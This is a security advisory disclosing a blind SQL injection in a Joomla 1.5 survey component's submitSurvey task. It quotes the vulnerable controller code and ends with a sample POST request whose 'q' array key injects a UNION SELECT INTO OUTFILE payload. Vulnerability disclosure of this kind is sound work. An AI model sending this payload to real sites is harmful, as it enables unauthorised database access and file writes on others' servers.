I. ABOUT THE APPLICATION
________________________

A Joomla 1.5 free and open source tool for online surveys
and statistical analysis.


II. DESCRIPTION
_______________

A parameter is not properly sanitised before  being  used
in a SQL query.


III. ANALYSIS
_____________

Summary:

 A) Blind SQL Injection


A) Blind SQL Injection
_______________________

Input  passed  to  the  "q"   parameter  in when "option"
is set to "com_jquarks4s" and "task" to "submitSurvey" is
not properly verified before  being  used in a SQL query.
This  can  be  exploited to  manipulate  SQL  queries  by
injecting arbitrary SQL code.

The following is the vulnerable code (controller.php):


function submitSurvey()
{
  // get post data
  $data = JRequest::get('post');

...

$questions = $data['q'];
// debug
//var_dump($data);exit;
foreach ($questions as $question_id => $question) :

  $type_id = (int)$question['type_id'];

  switch ($type_id) :

...

  case 4:
    // recuperer les row_id du question_id
    $rowsDB = $sessionModel->getRows($question_id);


So,  $question_id  is  a key of the array "q" and type_id
his value. Therefore  the  injection   is   possibile  by
inserting  arbitrary SQL code as the key of the array and
4 as his value.


IV. SAMPLE CODE
_______________

A) Blind SQL Injection

Try  to  send the following packet to your  test  server.
Ensure that  magic_quotes_gpc  is  set to off in order to
use the following test.


POST /path/index.php HTTP/1.1
Host: target
Content-Type: application x-www-form-urlencoded
Content-Length: 97

option=com_jquarks4s&task=submitSurvey&q[-1 UNION SELECT 0x414141 INTO OUTFILE '/tmp/trycopy' ]=4


Note that if you want to use the '=' character, you  must
covert it in URL encode format (%3D), otherwise the value
4 needed for the injection cannot be read.


V. FIX
______

No fix.
